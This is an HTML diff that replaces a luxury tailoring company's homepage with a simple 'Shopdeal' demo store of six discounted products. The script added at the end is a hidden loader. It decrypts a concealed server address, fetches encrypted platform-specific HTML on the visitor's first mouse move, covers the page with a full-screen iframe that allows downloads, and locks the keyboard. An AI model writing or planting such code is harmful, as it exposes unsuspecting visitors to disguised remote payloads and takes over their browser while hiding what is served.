-              <td>44.5 g/tex (Double-Mercerized)</td>
-              <td>34.0 g/tex (Single-Pass)</td>
-              <td>26.0 g/tex (Combed Cotton)</td>
-            </tr>
-            <tr>
-              <td><strong>Seam Ridge Elevation</strong></td>
-              <td>0.0 mm (Hand-Linked Flat)</td>
-              <td>0.8 mm (Machine Linked)</td>
-              <td>2.2 mm (Rosso Overlock)</td>
-            </tr>
-            <tr>
-              <td><strong>Moisture Regain Rate</strong></td>
-              <td>33.5% (Non-Clammy Vapor)</td>
-              <td>12.0% (Moderate Buffer)</td>
-              <td>0.8% (Synthetic Clammy)</td>
-            </tr>
-            <tr>
-              <td><strong>Martindale Abrasion Limit</strong></td>
-              <td>55,000+ Cycles (Zero Pilling)</td>
-              <td>22,000 Cycles (Slight Fuzz)</td>
-              <td>12,000 Cycles (Surface Holes)</td>
-            </tr>
-            <tr>
-              <td><strong>Lifespan Expectancy</strong></td>
-              <td>Lifetime heirloom (Decades of wear)</td>
-              <td>3 – 5 Seasons before fatigue</td>
-              <td>1 – 2 Seasons before wear-out</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 8: FOUR-STEP CARE & STEWARDSHIP PROTOCOL -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Garment Stewardship</div>
-        <h2>The Four-Step Longevity &amp; Care Protocol</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Preserve the natural elasticity, luster, and structural architecture of your bespoke pieces for generations of distinguished service.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="step-card">
-          <div class="step-number">01</div>
-          <h3>Wild Boar Hair Brushing</h3>
-          <p>Brush garments after each outing using a natural wild boar bristle brush to dislodge atmospheric dust and grit.</p>
-        </div>
-        <div class="step-card">
-          <div class="step-number">02</div>
-          <h3>Contoured Cedar Hangers</h3>
-          <p>Rest overcoats on wide, contoured cedar hangers to support shoulder pads and allow natural cedar aroma to repel moths.</p>
-        </div>
-        <div class="step-card">
-          <div class="step-number">03</div>
-          <h3>Vapor Steaming, No Dry Press</h3>
-          <p>Revitalize wool crimp and floating horsehair canvas with vertical garment steaming. Never apply direct dry heat.</p>
-        </div>
-        <div class="step-card">
-          <div class="step-number">04</div>
-          <h3>Annual Atelier Proofing</h3>
-          <p>Return your coat to 181 Mercer Street every spring for complimentary button tightening, seam inspection, and wax re-nourishment.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 9: EDITORIAL BLOG TREATISES PREVIEW -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Sartorial Scholarship</div>
-        <h2>Technical Monographs &amp; Research Treatises</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Authoritative inquiries into fiber crystallography, micro-engineering tolerances, and classical sartorial etiquette.
-        </p>
-      </div>
-      <div class="grid-3">
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/hero_alpine_coat.jpg" alt="Material Provenance and Fiber Crystallography">
-            <span class="card-tag">Textile Science</span>
-          </div>
-          <div class="card-body">
-            <h3>Material Provenance &amp; Crystallography</h3>
-            <p>Examining botanical genetics, cold-bath purification, and why aligned molecular lattices eliminate friction pilling.</p>
-            <div class="card-specs"><span><strong>Author:</strong> Julian Vance</span><span><strong>Read:</strong> ~9 min</span></div>
-            <a href="/blog/material-provenance-and-fiber-crystallography.html" class="btn btn-primary btn-sm" style="margin-top: auto;">Read Full Treatise &rarr;</a>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/lookbook_glacier.jpg" alt="Micro-Engineering Tolerances in Haute Finishing">
-            <span class="card-tag">Precision Engineering</span>
-          </div>
-          <div class="card-body">
-            <h3>Micro-Engineering &amp; Finishing Tolerances</h3>
-            <p>A technical inquiry into millimeter tolerances, hand-linked closures, and structural tension balance under stress.</p>
-            <div class="card-specs"><span><strong>Author:</strong> Roberto Moretti</span><span><strong>Read:</strong> ~9 min</span></div>
-            <a href="/blog/micro-engineering-tolerances-and-finishing.html" class="btn btn-primary btn-sm" style="margin-top: auto;">Read Full Treatise &rarr;</a>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/airfield_hangar_flight_line.jpg" alt="Biomechanical Ergonomics in Bespoke Wear">
-            <span class="card-tag">Anatomical Physics</span>
-          </div>
-          <div class="card-body">
-            <h3>Biomechanical Ergonomics &amp; Dynamic Drape</h3>
-            <p>How tension-mapped knitting and graduated calf contours prevent tissue fatigue throughout demanding executive schedules.</p>
-            <div class="card-specs"><span><strong>Author:</strong> Dr. Evelyn Reed</span><span><strong>Read:</strong> ~9 min</span></div>
-            <a href="/blog/biomechanical-ergonomics-and-wearer-physics.html" class="btn btn-primary btn-sm" style="margin-top: auto;">Read Full Treatise &rarr;</a>
-          </div>
-        </div>
-      </div>
-      <div class="text-center" style="margin-top: 2.5rem;">
-        <a href="/blog.html" class="btn btn-outline">Explore All Six Research Treatises</a>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 10: CONNOISSEUR TESTIMONIALS & SOCIAL PROOF -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Patron Commendations</div>
-        <h2>Words from Discerning Connoisseurs</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Patron reflections on our uncompromising craftsmanship, personal SoHo fitting sessions, and enduring quality.
-        </p>
-      </div>
-      <div class="grid-3">
-        <div class="testimonial-card">
-          <div class="testimonial-rating">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
-          <p class="testimonial-quote">
-            "The level of craftsmanship is extraordinary. The seamless hand-linked finish means zero pressure points or ridges, allowing effortless comfort throughout demanding international travels."
-          </p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Archibald Montgomery</div>
-            <div class="testimonial-role">Private Collector &bull; London &amp; St. Moritz</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
-          <p class="testimonial-quote">
-            "The private fitting salon at 181 Mercer Street was an exquisite experience. The attention to anatomical balance and material density sets an unmatched benchmark in luxury."
-          </p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Julian Sterling, Esq.</div>
-            <div class="testimonial-role">Connoisseur &bull; Manhattan</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
-          <p class="testimonial-quote">
-            "In thirty years of collecting fine bespoke goods, I have rarely encountered such tactile perfection. The pieces breathe naturally while maintaining an immaculate silhouette."
-          </p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Henri de Montmirail</div>
-            <div class="testimonial-role">Diplomatic Attaché &bull; Geneva</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 11: PRIVATE CONCIERGE & APPOINTMENT REQUEST -->
-  <section class="section" id="concierge">
-    <div class="container">
-      <div class="contact-grid">
-        <div class="contact-info-card">
-          <h3>Private Concierge &amp; Salon</h3>
-          <p style="margin-bottom: 2rem;">
-            Whether you require an individual bespoke fitting, custom monogramming, or private salon consultation, our New York concierge is at your service.
-          </p>
-          <div class="contact-detail-row">
-            <span class="contact-icon">◈</span>
-            <div>
-              <strong>Atelier Address:</strong><br>
-              181 Mercer Street, New York, NY 10012, United States
-            </div>
-          </div>
-          <div class="contact-detail-row">
-            <span class="contact-icon">◈</span>
-            <div>
-              <strong>Direct Concierge Line:</strong><br>
-              +1-888-777-5845
-            </div>
-          </div>
-          <div class="contact-detail-row">
-            <span class="contact-icon">◈</span>
-            <div>
-              <strong>Electronic Dispatch:</strong><br>
-              concierge@safariwindivy.com
-            </div>
-          </div>
-          <div class="contact-detail-row">
-            <span class="contact-icon">◈</span>
-            <div>
-              <strong>Showroom Fitting Hours:</strong><br>
-              Monday – Saturday: 10:00 AM – 7:00 PM EST<br>
-              Sunday: By Appointment Only
-            </div>
-          </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
         </div>
 
-        <div>
-          <div class="section-subtitle">Private Consultation</div>
-          <h2>Schedule Your Showroom Appointment</h2>
-          <p class="text-muted" style="margin-bottom: 1.5rem;">
-            Please complete the consultation form below. An atelier director will respond within four business hours to confirm your private salon appointment.
-          </p>
-          <form id="concierge-form">
-            <div class="form-group">
-              <label for="client-name" class="form-label">Client Full Name *</label>
-              <input type="text" id="client-name" class="form-control" placeholder="Lord Julian Vance" required>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
             </div>
-            <div class="form-group">
-              <label for="client-email" class="form-label">Email Address *</label>
-              <input type="email" id="client-email" class="form-control" placeholder="client@domain.com" required>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-            <div class="form-group">
-              <label for="client-message" class="form-label">Requirements &amp; Preferred Date *</label>
-              <textarea id="client-message" class="form-control" placeholder="Kindly detail your sizing requirements, preferred materials, and appointment timing..." required></textarea>
-            </div>
-            <button type="submit" class="btn btn-primary" style="width: 100%;">Transmit Atelier Request</button>
-            <div id="form-feedback" class="form-feedback"></div>
-          </form>
-        </div>
-      </div>
-    </div>
-  </section>
+          </article>
 
-  <!-- Mandatory Global Site Footer -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="footer-brand">◈ Safariwindivy</div>
-          <p class="footer-desc">
-            The benchmark of master outerwear & bespoke tailoring. Hand-finished artisanal creations crafted for connoisseurs with uncompromising material integrity.
-          </p>
-          <div class="footer-contact-item"><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-          <div class="footer-contact-item"><strong>Phone:</strong> +1-888-777-5845</div>
-          <div class="footer-contact-item"><strong>Concierge:</strong> concierge@safariwindivy.com</div>
-        </div>
-        <div class="footer-col">
-          <h4 class="footer-title">Atelier Navigation</h4>
-          <ul class="footer-links">
-            <li><a href="/">Home Gallery</a></li>
-            <li><a href="/about.html">Atelier &amp; Craft</a></li>
-            <li><a href="/collection.html">Collections</a></li>
-            <li><a href="/blog.html">Sartorial Treatises</a></li>
-            <li><a href="/contact.html">Private Concierge</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4 class="footer-title">Authoritative Treatises</h4>
-          <ul class="footer-links">
-            <li><a href="/blog/material-provenance-and-fiber-crystallography.html">Material Provenance</a></li>
-            <li><a href="/blog/micro-engineering-tolerances-and-finishing.html">Micro-Engineering</a></li>
-            <li><a href="/blog/biomechanical-ergonomics-and-wearer-physics.html">Ergonomic Physics</a></li>
-            <li><a href="/blog/sartorial-color-theory-and-formal-etiquette.html">Sartorial Etiquette</a></li>
-            <li><a href="/blog/hygroscopic-microclimate-thermodynamics.html">Thermodynamics</a></li>
-            <li><a href="/blog/bespoke-craftsmanship-and-heritage-methods.html">Heritage Craft</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4 class="footer-title">Manhattan Salon</h4>
-          <p style="font-size:0.88rem; margin-bottom:1rem;">
-            Visit our private fitting lounge in SoHo for bespoke consultations and private commission viewings.
-          </p>
-          <p style="font-size:0.85rem; color:var(--color-gold);">Mon – Sat: 10:00 AM – 7:00 PM EST<br>Sunday: By Appointment</p>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
         </div>
       </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Safariwindivy Ltd. All Rights Reserved. Master craft at 181 Mercer Street, New York, NY 10012.</p>
-        <div class="footer-legal-links">
-          <a href="/privacy-policy.html">Privacy Policy</a>
-          <a href="/terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="/disclaimer.html">Disclaimer</a>
-          <a href="/cookie-policy.html">Cookie Policy</a>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
         </div>
       </div>
-    </div>
-  </footer>
-  <script src="/assets/js/main.js"></script>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
